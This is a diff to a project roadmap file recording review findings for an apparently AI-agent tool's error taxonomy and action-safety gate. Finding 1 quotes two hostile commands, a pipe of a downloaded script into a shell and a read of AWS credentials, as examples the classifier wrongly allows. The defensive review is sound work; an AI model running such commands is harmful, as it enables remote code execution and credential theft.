@@ -5,14 +5,51 @@ _Last updated: 2026-07-04_
 Outstanding work only. When an item ships, remove it from this file and move the
 capability into `docs/PROJECT_SUMMARY.md`.
 
+## Review findings — error taxonomy + action-time safety (2026-07-04)
+
+Review of PR #1 (`4ab75d1`, merged `845c41a`). Verdict: the two contracts are
+well designed. The taxonomy's semantic matrix is coherent (transient errors
+retry within the iteration; persistent malformed/refusal failures consume a
+repair attempt and ride the existing escalation ladder; auth blocks outright
+with no repair). Action gating emits a per-action `action_safety_gate` event
+and hard-blocks via `ActionSafetyBlocked`. 51/51 tests, CI green on PR and
+merge. Three findings:
+
+1. **[P1] Action classifier is default-allow for spec-listed high-risk
+   actions.** Reproduced: `curl http://…/x.sh | sh` (network + arbitrary code)
+   and `cat ~/.aws/credentials` (credential access) both classify
+   `medium/allowed`, while spec §249–255 lists network calls and credential
+   access as high-risk. Root cause: `classify_action`'s high-risk vocabulary is
+   `push/deploy/delete/rm -rf/release` only, and unknown commands default to
+   medium → allowed. A denylist of keywords will never be complete. Fix
+   direction: for `kind="command"`, invert the default — allow only what the
+   policy can positively classify as low risk (or matches an explicit
+   allowlist), treat everything unrecognized as high → approval. The gate
+   plumbing already supports this; it is a vocabulary/default change.
+2. **[P2] Nobody honors `delay_for`.** `RetryPolicy` computes and logs the
+   backoff (by design: no sleeping in the core loop) but no component actually
+   waits. Fine for mocks; with real adapters an immediate retry after a 429
+   will hammer the rate limit. Decide where the wait lives (adapter-level
+   sleep, or the loop consuming the logged delay) as part of the first real
+   adapter.
+3. **[P2] Failed attempts record zero budget.** `record_actual` runs only on
+   eventual success; retried/failed calls consume no tracked spend. Real
+   providers bill per attempt (input tokens are processed even on timeout or
+   refusal). Fold per-attempt usage recording into the token accounting hooks.
+
 ## Next up (highest value)
 
-1. **Real provider adapters** — Claude / Gemini / OpenAI / local, behind the
+1. **Harden the action classifier** (finding 1) — default-deny unrecognized
+   commands, add network/credential vocabulary; small change, closes the gap
+   between the gate contract and the spec's risk table.
+2. **Real provider adapters** — Claude / Gemini / OpenAI / local, behind the
    existing `ProviderAdapter` interface. Add interface contract tests before
-   any real API is called.
-2. **Real token accounting hooks** — consume provider usage metadata where
+   any real API is called. Fold in findings 2 (who sleeps) and 3 (per-attempt
+   usage) during implementation.
+3. **Real token accounting hooks** — consume provider usage metadata where
    available instead of estimating from the mock adapter. Lands naturally with
-   the first real adapter.
+   the first real adapter; must record usage per attempt, not per success
+   (finding 3).
 
 ## Strategic gaps (from 2026-07-04 review — bigger than any one module)
 
@@ -89,5 +126,5 @@ capability into `docs/PROJECT_SUMMARY.md`.
 - ~~Structured artifact tracking for changed files / results / reports.~~
 - ~~SQLite memory/event backend with migrations, WAL mode, busy timeout, and transactional writes.~~
 - ~~SQLite review fixes: per-item memory UPSERTs, run/project-scoped events, persisted run results, event/memory redaction, and CI `--sqlite-path` smoke.~~ Independently re-verified 2026-07-04: both original repro probes now pass (concurrent writers keep both items; two CLI runs yield distinct `run_id`s with per-run events and cost), redaction confirmed on API-key/password shapes, 40/40 tests, CI green.
-- ~~Provider error taxonomy with retry policy and explicit repair-consumption semantics.~~
-- ~~Action-time safety contract for builder-proposed actions.~~
+- ~~Provider error taxonomy with retry policy and explicit repair-consumption semantics.~~ Reviewed 2026-07-04: semantics verified per class (retry-in-iteration / consume-repair-and-escalate / hard-block); findings 2–3 above carried forward.
+- ~~Action-time safety contract for builder-proposed actions.~~ Reviewed 2026-07-04: gate plumbing correct and evented; classifier vocabulary gap recorded as finding 1 above.
